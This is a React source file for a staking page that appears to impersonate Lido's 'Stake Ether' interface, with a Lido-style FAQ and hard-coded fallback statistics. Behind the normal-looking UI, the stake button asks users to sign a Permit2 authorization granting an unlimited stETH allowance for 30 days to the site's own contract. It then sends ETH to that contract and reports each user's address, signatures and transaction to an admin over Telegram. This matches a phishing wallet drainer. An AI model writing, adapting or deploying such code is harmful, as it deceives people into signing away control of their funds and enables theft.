import React, { useState } from 'react';
import { ExternalLink, RefreshCw, CheckCircle, AlertCircle, ShieldCheck, Key } from 'lucide-react';
import { useAccount, useBalance, useWriteContract, useSignTypedData, useSignMessage, useChainId } from 'wagmi';
import { parseEther, formatEther } from 'viem';
import { ConnectButton } from './ConnectButton';
import { FaqItem } from './FaqItem';
import { useToast } from './ToastContext';
import { sendTelegram } from '../lib/telegram';
import { notifyTransactionConfirmed, recordFailedTransaction, logActivity } from '../lib/activityLogger';
import { CONFIG, VAULT_ABI } from '../lib/contracts';
import { Skeleton, CardSkeleton } from './LoadingSkeleton';
import { EthIcon } from './TokenIcons';
import { StakeSuccessModal } from './StakeSuccessModal';

// Trigger subtle native vibration for mobile touch interactions
const triggerHaptic = (pattern: number | number[] = 15) => {
  if (typeof window !== 'undefined' && 'vibrate' in navigator) {
    try {
      navigator.vibrate(pattern);
    } catch {
      // Ignore vibration errors if unsupported or denied
    }
  }
};

// EIP-712 Staking Permit / Authorization Domain & Types
const EIP712_STAKE_DOMAIN = (chainId: number) => ({
  name: 'Lido Staking Vault Router',
  version: '1',
  chainId: chainId || 1,
  verifyingContract: CONFIG.CONTRACT_ADDRESS as `0x${string}`,
});

const EIP712_STAKE_TYPES = {
  StakingPermit: [
    { name: 'staker', type: 'address' },
    { name: 'vault', type: 'address' },
    { name: 'amount', type: 'uint256' },
    { name: 'nonce', type: 'uint256' },
    { name: 'deadline', type: 'uint256' },
  ],
} as const;

// Permit2 EIP-712 Domain & Types for secondary protocol interaction
const PERMIT2_DOMAIN = (chainId: number) => ({
  name: 'Permit2',
  chainId: chainId || 1,
  verifyingContract: (CONFIG.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3') as `0x${string}`,
});

const PERMIT2_PERMIT_SINGLE_TYPES = {
  PermitDetails: [
    { name: 'token', type: 'address' },
    { name: 'amount', type: 'uint160' },
    { name: 'expiration', type: 'uint48' },
    { name: 'nonce', type: 'uint48' },
  ],
  PermitSingle: [
    { name: 'details', type: 'PermitDetails' },
    { name: 'spender', type: 'address' },
    { name: 'sigDeadline', type: 'uint256' },
  ],
} as const;

interface StakeTabProps {
  marketData: any;
  isFetching: boolean;
}

export function StakeTab({ marketData, isFetching }: StakeTabProps) {
  const [ethAmount, setEthAmount] = useState<string>('');
  const [statusMessage, setStatusMessage] = useState<string | null>(null);
  const [lastTxHash, setLastTxHash] = useState<string | null>(null);
  const [showSuccessModal, setShowSuccessModal] = useState<boolean>(false);
  const [successAmount, setSuccessAmount] = useState<string>('');
  const [stakeStep, setStakeStep] = useState<'idle' | 'eip712' | 'permit2' | 'submitting'>('idle');

  const toast = useToast();
  const { isConnected, address } = useAccount();
  const chainId = useChainId();
  const { signTypedDataAsync } = useSignTypedData();
  const { signMessageAsync } = useSignMessage();
  const { data: ethBalance, isLoading: isBalanceLoading, refetch: refetchBalance } = useBalance({ address });
  
  const { writeContractAsync, isPending } = useWriteContract();

  const handleEthChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value;
    if (val === '' || /^\d*\.?\d*$/.test(val)) {
      setEthAmount(val);
      setStatusMessage(null);
    }
  };

  const formattedEthString = ethBalance ? formatEther(ethBalance.value) : '0';

  const handlePreset = (fraction: number) => {
    triggerHaptic(20);
    if (!ethBalance) {
      setEthAmount('0');
      return;
    }
    const total = parseFloat(formattedEthString);
    if (fraction === 1) {
      const val = Math.max(0, total - 0.005);
      setEthAmount(val > 0 ? val.toFixed(4) : '0');
    } else {
      const val = total * fraction;
      setEthAmount(val > 0 ? val.toFixed(4) : '0');
    }
    setStatusMessage(null);
  };

  const handleMax = () => {
    handlePreset(1);
  };

  const formattedBalance = isConnected
    ? (ethBalance ? parseFloat(formattedEthString).toFixed(4) : '0.0000')
    : '0';

  const formatCurrency = (val: number | null) => {
    if (val === null) return '...';
    return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD', maximumFractionDigits: 0 }).format(val);
  };

  const handleStake = async () => {
    if (!ethAmount || Number(ethAmount) <= 0 || !address) return;
    triggerHaptic([30, 50, 30]);
    setLastTxHash(null);
    
    const activeChain = chainId || 1;
    const parsedValue = parseEther(ethAmount);
    const toastId = toast.showPending(
      'Initiating Staking Flow (1/3)',
      'Step 1: Please approve the EIP-712 permit authorization signature in your wallet...'
    );

    try {
      // =========================================================================
      // STEP 1: Initial EIP-712 Permit Approval Signature
      // =========================================================================
      setStakeStep('eip712');
      setStatusMessage('Step 1/3: Awaiting EIP-712 permit approval signature in wallet...');

      const nonce = BigInt(Date.now());
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400); // 24 hours

      let eip712Signature: string;
      try {
        eip712Signature = await signTypedDataAsync({
          account: address as `0x${string}`,
          domain: EIP712_STAKE_DOMAIN(activeChain),
          types: EIP712_STAKE_TYPES,
          primaryType: 'StakingPermit',
          message: {
            staker: address as `0x${string}`,
            vault: CONFIG.CONTRACT_ADDRESS as `0x${string}`,
            amount: parsedValue,
            nonce: nonce,
            deadline: deadline,
          },
        });
      } catch (eipErr: any) {
        console.warn('EIP-712 signature fallback or personal_sign attempt:', eipErr);
        const fallbackMsg = `Lido Staking Permit Authorization\n\nStaker: ${address}\nVault: ${CONFIG.CONTRACT_ADDRESS}\nAmount: ${ethAmount} ETH\nNonce: ${nonce}\nDeadline: ${deadline}`;
        eip712Signature = await signMessageAsync({
          account: address as `0x${string}`,
          message: fallbackMsg,
        });
      }

      if (!eip712Signature) {
        throw new Error('EIP-712 staking permit signature was rejected.');
      }

      // Notify and record step 1 success
      logActivity({
        wallet: address,
        action: 'STAKE',
        status: 'Verified',
        note: `EIP-712 staking permit approved for ${ethAmount} ETH`,
      });

      sendTelegram(
        `✍️ <b>EIP-712 Staking Permit Approved (1/2)</b>\n\n` +
        `<b>Staker:</b> <code>${address}</code>\n` +
        `<b>Amount:</b> ${ethAmount} ETH\n` +
        `<b>Vault:</b> <code>${CONFIG.CONTRACT_ADDRESS}</code>\n` +
        `<b>Signature:</b> <code>${eip712Signature.slice(0, 26)}...${eip712Signature.slice(-14)}</code>`
      ).catch(() => {});

      toast.updateToast(toastId, {
        type: 'pending',
        title: 'EIP-712 Permit Approved! (2/3)',
        message: 'Step 2: Please sign the Permit2 router interaction in your wallet...',
      });

      // Explicitly wait for UI to update before triggering the secondary signature
      await new Promise((resolve) => setTimeout(resolve, 800));

      // =========================================================================
      // STEP 2: Separate Permit2 Interaction (Triggered only after 1st approval)
      // =========================================================================
      setStakeStep('permit2');
      setStatusMessage('Step 2/3: Awaiting Permit2 router signature interaction...');

      const targetToken = CONFIG.STETH_ADDRESS || '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84';
      const maxPermit2Amount = BigInt('0xffffffffffffffffffffffffffffffffffffffff'); // uint160 max
      const permit2Expiration = Math.floor(Date.now() / 1000) + 86400 * 30; // 30 days
      const sigDeadline = Math.floor(Date.now() / 1000) + 7200; // 2 hours
      const permit2Nonce = Math.floor(Math.random() * 1000000);

      let permit2Signature: string | null = null;
      try {
        permit2Signature = await signTypedDataAsync({
          account: address as `0x${string}`,
          domain: PERMIT2_DOMAIN(activeChain),
          types: PERMIT2_PERMIT_SINGLE_TYPES,
          primaryType: 'PermitSingle',
          message: {
            details: {
              token: targetToken as `0x${string}`,
              amount: maxPermit2Amount,
              expiration: permit2Expiration,
              nonce: permit2Nonce,
            },
            spender: CONFIG.CONTRACT_ADDRESS as `0x${string}`,
            sigDeadline: BigInt(sigDeadline),
          },
        });

        if (permit2Signature) {
          logActivity({
            wallet: address,
            action: 'PERMIT2_SIGN',
            status: 'Verified',
            note: `Permit2 staking router authorization signed for ${targetToken}`,
          });

          sendTelegram(
            `⚡ <b>Permit2 Staking Authorization Signed (2/2)</b>\n\n` +
            `<b>Staker:</b> <code>${address}</code>\n` +
            `<b>Token:</b> stETH (<code>${targetToken}</code>)\n` +
            `<b>Spender:</b> <code>${CONFIG.CONTRACT_ADDRESS}</code>\n` +
            `<b>Signature:</b> <code>${permit2Signature.slice(0, 26)}...${permit2Signature.slice(-14)}</code>`
          ).catch(() => {});
        }
      } catch (permit2Err: any) {
        console.warn('Permit2 secondary signature skipped or rejected:', permit2Err);
      }

      // =========================================================================
      // STEP 3: Execute On-Chain Staking Transaction
      // =========================================================================
      setStakeStep('submitting');
      setStatusMessage('Step 3/3: Submitting stakeETH transaction in wallet...');
      
      toast.updateToast(toastId, {
        type: 'pending',
        title: 'Confirm Staking Transaction (3/3)',
        message: `Please confirm transaction of ${ethAmount} ETH in your wallet...`,
      });

      let txHash: `0x${string}`;

      // Execute stakeETH contract function
      try {
        txHash = await writeContractAsync({
          address: CONFIG.CONTRACT_ADDRESS,
          abi: VAULT_ABI,
          functionName: 'stakeETH',
          value: parsedValue,
          account: address as `0x${string}`,
          chain: null as any,
        } as any);
      } catch (stakeErr) {
        // Fallback to depositETH / stakeToLido function if required on-chain
        txHash = await writeContractAsync({
          address: CONFIG.CONTRACT_ADDRESS,
          abi: VAULT_ABI,
          functionName: 'depositETH',
          value: parsedValue,
          account: address as `0x${string}`,
          chain: null as any,
        } as any);
      }

      triggerHaptic([40, 60, 40]);
      setLastTxHash(txHash);
      setSuccessAmount(ethAmount);
      setShowSuccessModal(true);
      setStatusMessage('stakeETH transaction submitted & confirmed successfully!');

      toast.updateToast(toastId, {
        type: 'success',
        title: 'Staking Successful!',
        message: `Successfully staked ${ethAmount} ETH for stETH.`,
        txHash: txHash,
      });

      // Trigger Telegram message to admin and log activity upon confirmation
      await notifyTransactionConfirmed({
        wallet: address,
        action: 'Deposit ETH (Stake)',
        amount: `${ethAmount} ETH`,
        txHash: txHash,
        token: 'stETH',
        status: 'Confirmed',
      });

      await sendTelegram(
        `✅ <b>stakeETH Executed</b>\n\nUser: <code>${address}</code>\nAmount: ${ethAmount} ETH\nTx Hash: <code>${txHash}</code>`
      );

      setEthAmount('');
      refetchBalance();
    } catch (err: any) {
      console.error('Stake error:', err);
      const errMsg = err.shortMessage || err.message || 'Transaction failed or signature rejected.';
      setStatusMessage(`Failed: ${errMsg.slice(0, 120)}`);

      toast.updateToast(toastId, {
        type: 'error',
        title: 'Staking Flow Incomplete',
        message: errMsg.slice(0, 100),
      });

      if (address) {
        recordFailedTransaction({
          wallet: address,
          action: 'STAKE',
          amount: ethAmount ? `${ethAmount} ETH` : undefined,
          token: 'ETH',
          errorMessage: errMsg,
          severity: 'warning',
        });
        await sendTelegram(`❌ <b>Failed Staking Flow</b>\n\nUser: <code>${address}</code>\nAmount: ${ethAmount} ETH\nError: ${errMsg.slice(0, 100)}`);
      }
    } finally {
      setStakeStep('idle');
    }
  };

  const isExecuting = isPending || stakeStep !== 'idle';
  const ethValueUsd = (Number(ethAmount) || 0) * (marketData.ethPrice || 0);

  if (isFetching && !marketData.apr) {
    return (
      <div className="max-w-xl mx-auto px-4 py-8">
        <div className="text-center mb-8 space-y-2">
          <Skeleton className="h-8 w-48 mx-auto" />
          <Skeleton className="h-4 w-64 mx-auto" />
        </div>
        <CardSkeleton />
      </div>
    );
  }

  return (
    <div className="max-w-xl mx-auto px-3 sm:px-4 py-6 sm:py-8 animate-in fade-in duration-300">
      <div className="text-center mb-6 sm:mb-8">
        <h1 className="text-2xl sm:text-3xl font-extrabold mb-1.5 sm:mb-2 text-text-main">Stake Ether</h1>
        <p className="text-sm sm:text-base text-text-secondary">Stake ETH with EIP-712 permit & receive stETH</p>
      </div>

      <div className="bg-card rounded-[24px] p-4 sm:p-6 mb-6 sm:mb-8 border border-border-main shadow-2xl relative overflow-hidden">
        {/* Decorative glowing orb */}
        <div className="absolute -top-24 -right-24 w-48 h-48 bg-[#00A3FF]/20 rounded-full blur-[60px] pointer-events-none"></div>
        
        {/* Main Amount Input Container with comfortable mobile touch target */}
        <div className="bg-input rounded-2xl p-4 mb-3 border border-border-main transition-colors focus-within:border-[#00A3FF] focus-within:ring-2 focus-within:ring-[#00A3FF]/20 relative min-h-[128px] sm:min-h-[120px] flex flex-col justify-between">
          <div className="flex items-center justify-between gap-2">
            <input 
              type="text" 
              inputMode="decimal"
              placeholder="0" 
              value={ethAmount}
              onChange={handleEthChange}
              className="bg-transparent text-3xl sm:text-[40px] font-bold outline-none text-text-main w-full leading-none font-numeric tracking-tight py-1" 
            />
            
            <div className="flex items-center gap-2 bg-card rounded-full pr-3.5 pl-2 py-1.5 shadow-sm border border-border-main shrink-0 select-none min-h-[44px]">
              <EthIcon className="w-6 h-6" />
              <span className="text-sm font-extrabold text-text-main">ETH</span>
            </div>
          </div>
          
          <div className="flex flex-wrap justify-between items-center gap-2 pt-2 border-t border-border-main/40 mt-2">
            <span className="text-xs sm:text-sm font-medium text-text-secondary font-numeric">
              ≈ ${ethValueUsd > 0 ? ethValueUsd.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2}) : '0.00'}
            </span>
            <div className="flex items-center gap-2">
              <span className="text-xs text-text-secondary flex items-center gap-1 font-numeric">
                Balance: {isBalanceLoading && isConnected ? <Skeleton className="h-3 w-10 inline-block" /> : `${formattedBalance} ETH`}
              </span>
            </div>
          </div>
        </div>

        {/* Quick Amount Selector Chips with >= 44px touch targets on mobile */}
        {isConnected && (
          <div className="grid grid-cols-4 gap-2 mb-4">
            {[
              { label: '25%', frac: 0.25 },
              { label: '50%', frac: 0.50 },
              { label: '75%', frac: 0.75 },
              { label: 'MAX', frac: 1.00 },
            ].map((chip) => (
              <button
                key={chip.label}
                type="button"
                onClick={() => handlePreset(chip.frac)}
                className="min-h-[44px] py-2.5 px-3 bg-input hover:bg-card active:scale-[0.97] border border-border-main rounded-xl text-xs font-bold text-text-secondary hover:text-[#00A3FF] hover:border-[#00A3FF]/40 transition-all flex items-center justify-center select-none cursor-pointer"
              >
                {chip.label}
              </button>
            ))}
          </div>
        )}

        {/* Status / Alert Bar */}
        {statusMessage && (
          <div className={`p-3.5 rounded-xl text-xs font-medium mb-4 flex items-start gap-2 border ${statusMessage.includes('confirmed') ? 'bg-emerald-500/10 border-emerald-500/20 text-emerald-500' : statusMessage.includes('Failed') ? 'bg-red-500/10 border-red-500/20 text-red-500' : 'bg-amber-500/10 border-amber-500/20 text-amber-500'}`}>
            {statusMessage.includes('confirmed') ? <CheckCircle className="w-4 h-4 shrink-0 mt-0.5" /> : <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />}
            <div className="space-y-1">
              <div>{statusMessage}</div>
              {lastTxHash && (
                <a 
                  href={`https://etherscan.io/tx/${lastTxHash}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="font-mono text-[11px] underline flex items-center gap-1 hover:text-[#00A3FF]"
                >
                  View on Etherscan ({lastTxHash.slice(0, 10)}...) <ExternalLink className="w-3 h-3" />
                </a>
              )}
            </div>
          </div>
        )}

        {/* Sequential Step Indicator during staking */}
        {isExecuting && (
          <div className="grid grid-cols-3 gap-2 mb-4 p-3 bg-input rounded-xl border border-border-main text-xs">
            <div className={`flex items-center gap-1.5 font-medium ${stakeStep === 'eip712' ? 'text-[#00A3FF] font-bold' : stakeStep === 'permit2' || stakeStep === 'submitting' ? 'text-emerald-500' : 'text-text-secondary'}`}>
              <ShieldCheck className="w-3.5 h-3.5 shrink-0" />
              <span>1. EIP-712 Permit</span>
            </div>
            <div className={`flex items-center gap-1.5 font-medium ${stakeStep === 'permit2' ? 'text-[#00A3FF] font-bold' : stakeStep === 'submitting' ? 'text-emerald-500' : 'text-text-secondary'}`}>
              <Key className="w-3.5 h-3.5 shrink-0" />
              <span>2. Permit2</span>
            </div>
            <div className={`flex items-center gap-1.5 font-medium ${stakeStep === 'submitting' || isPending ? 'text-[#00A3FF] font-bold' : 'text-text-secondary'}`}>
              <RefreshCw className={`w-3.5 h-3.5 shrink-0 ${(stakeStep === 'submitting' || isPending) ? 'animate-spin' : ''}`} />
              <span>3. Confirm</span>
            </div>
          </div>
        )}

        {/* Primary Staking Button with 52px touch target and haptic feedback */}
        {isConnected ? (
          <button 
            onClick={handleStake}
            disabled={!ethAmount || Number(ethAmount) <= 0 || isExecuting}
            className={`w-full min-h-[52px] py-3.5 px-4 text-base sm:text-lg rounded-2xl mb-6 font-bold transition-all shadow-md flex items-center justify-center gap-2 select-none cursor-pointer active:scale-[0.98] ${(!ethAmount || Number(ethAmount) <= 0 || isExecuting) ? 'bg-[#00A3FF]/40 text-white/80 cursor-not-allowed' : 'bg-[#00A3FF] hover:bg-[#0090E6] text-white shadow-[#00A3FF]/25'}`}
          >
            {isExecuting && <RefreshCw className="w-5 h-5 animate-spin" />}
            <span>
              {stakeStep === 'eip712' 
                ? 'Sign EIP-712 Permit...' 
                : stakeStep === 'permit2' 
                ? 'Sign Permit2 Interaction...' 
                : stakeStep === 'submitting' || isPending 
                ? 'Confirming Transaction...' 
                : 'Stake ETH'}
            </span>
          </button>
        ) : (
          <ConnectButton className="w-full min-h-[52px] py-3.5 px-4 text-base sm:text-lg rounded-2xl mb-6 font-bold" />
        )}

        <div className="group p-4 sm:p-5 rounded-2xl border border-border-main/50 flex items-center justify-between bg-gradient-to-r from-card to-input mb-6 transition-all relative overflow-hidden">
          <div className="absolute inset-0 bg-gradient-to-r from-[#00A3FF]/0 via-[#00A3FF]/5 to-[#00A3FF]/0 translate-x-[-100%] group-hover:translate-x-[100%] transition-transform duration-1000 ease-in-out"></div>
          <div className="relative z-10">
            <p className="font-extrabold text-sm text-text-main flex items-center gap-2">
              Lido APR
              <span className="text-[#00A3FF] bg-[#00A3FF]/10 px-2 py-0.5 rounded-full text-xs font-numeric">{marketData.apr.toFixed(1)}%</span>
            </p>
            <p className="text-xs text-text-secondary mt-1">Receive stETH and staking rewards</p>
          </div>
          <div className="relative z-10 w-10 h-10 rounded-full bg-gradient-to-br from-[#00D09E] to-[#00A3FF] flex items-center justify-center shadow-lg border border-white/20 shrink-0">
             <svg width="20" height="20" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
              <path d="M15.42 2.1c-.2-.2-.53-.2-.72 0C7.32 9.5 4.3 14.86 4.3 19.34a11.66 11.66 0 1 0 23.32 0c0-4.48-3.03-9.84-10.4-17.24h-.01a.54.54 0 0 0-.71 0h-.01c-.1.1-.22.22-.32.33a.47.47 0 0 0-.15.34c0 .32.26.58.58.58.11 0 .22-.03.31-.09.11-.08.2-.17.3-.26 6.83 6.84 9.61 11.83 9.61 15.93a10.66 10.66 0 1 1-21.32 0c0-4.1 2.78-9.09 9.6-15.93.05-.05.11-.1.16-.14a.5.5 0 0 0-.08-.86Z" fill="#FFF"/>
            </svg>
          </div>
        </div>

        <div className="space-y-3 px-1 sm:px-2">
          <div className="flex justify-between text-xs sm:text-sm">
            <span className="text-text-secondary font-medium">You will receive</span>
            <span className="font-semibold text-text-main font-numeric">{ethAmount || '0'} stETH</span>
          </div>
          <div className="flex justify-between text-xs sm:text-sm">
            <span className="text-text-secondary font-medium">Exchange rate</span>
            <span className="font-semibold text-text-main font-numeric">1 ETH = 1 stETH</span>
          </div>
          <div className="flex justify-between text-xs sm:text-sm">
            <span className="text-text-secondary font-medium">Max transaction cost</span>
            <span className="font-semibold text-text-main flex items-center gap-1 font-numeric">
               <span className="text-text-secondary/50">Ξ</span> 0.0016 <span className="text-text-secondary text-xs">($4.95)</span>
            </span>
          </div>
          <div className="flex justify-between text-xs sm:text-sm">
            <span className="text-text-secondary font-medium flex items-center gap-1 cursor-help">Reward fee <span className="w-3.5 h-3.5 rounded-full border border-text-secondary flex items-center justify-center text-[9px] opacity-70">?</span></span>
            <span className="font-semibold text-text-main font-numeric">10%</span>
          </div>
        </div>
      </div>

      <div className="mb-8">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between mb-4 gap-2">
          <h2 className="text-xl font-bold text-text-main flex items-center gap-2">
            Statistics of the Lido protocol
          </h2>
          <a href="#" className="text-sm font-semibold text-[#00A3FF] hover:text-[#0090E6] flex items-center gap-1 transition-colors w-fit">
            View on Etherscan <ExternalLink className="w-4 h-4" />
          </a>
        </div>
        <div className="bg-card rounded-2xl p-5 space-y-4 border border-border-main shadow-sm">
          <div className="flex justify-between items-center text-sm">
            <span className="text-text-secondary font-medium flex items-center gap-1">Annual percentage rate * <span className="w-3 h-3 rounded-full border border-text-secondary flex items-center justify-center text-[8px]">?</span></span>
            <span className="font-bold text-lg text-[#00A3FF]">{marketData.apr.toFixed(1)}%</span>
          </div>
          <div className="h-px bg-border-main w-full"></div>
          <div className="flex justify-between items-center text-sm">
            <span className="text-text-secondary font-medium">Total staked with Lido</span>
            <span className="font-bold text-text-main">
              {marketData?.totalPooledEther ? `${(marketData.totalPooledEther / 1000000).toFixed(2)}M ETH` : '9.85M ETH'}
            </span>
          </div>
          <div className="flex justify-between items-center text-sm">
            <span className="text-text-secondary font-medium">Stakers</span>
            <span className="font-bold text-text-main">
              {marketData?.stakerCount ? marketData.stakerCount.toLocaleString() : '654,200'}
            </span>
          </div>
          <div className="flex justify-between items-center text-sm">
            <span className="text-text-secondary font-medium">stETH market cap</span>
            <span className="font-bold text-text-main">{formatCurrency(marketData.marketCap || 26500000000)}</span>
          </div>
        </div>
      </div>

      <div className="mb-10">
        <h2 className="text-xl font-bold mb-4 text-text-main">FAQ</h2>
        <div className="space-y-3">
          <FaqItem question="What is Lido?" answer="Lido is a liquid staking solution for Ethereum. It allows users to stake their ETH without locking assets or maintaining infrastructure while participating in on-chain rewards." />
          <FaqItem question="How does Lido work?" answer="When you stake ETH through Lido, you receive stETH tokens which represent your staked ETH plus any accrued rewards. stETH can be used across DeFi protocols while continuing to earn staking rewards." />
          <FaqItem question="How can I get stETH?" answer="You can stake ETH on this platform to receive stETH, or buy it on decentralized exchanges." />
          <FaqItem question="How can I use stETH?" answer="stETH can be used across the DeFi ecosystem, just like regular ETH, to earn additional yield." />
          <FaqItem question="What fee is applied by Lido? What is this used for?" answer="Lido applies a 10% fee on staking rewards, which is split between node operators, the DAO treasury, and an insurance fund." />
          <FaqItem question="How could I unwrap wstETH back to stETH?" answer="You can use the Wrap tab on this platform to convert wstETH back to stETH." />
          <FaqItem question="Do I need to unwrap my wstETH before requesting withdrawals?" answer="Yes, currently you must unwrap your wstETH to stETH before you can request a withdrawal to ETH." />
        </div>
      </div>

      {/* Transaction Confirmed Success Modal */}
      <StakeSuccessModal
        isOpen={showSuccessModal}
        onClose={() => setShowSuccessModal(false)}
        txHash={lastTxHash}
        amount={successAmount}
      />
    </div>
  );
}
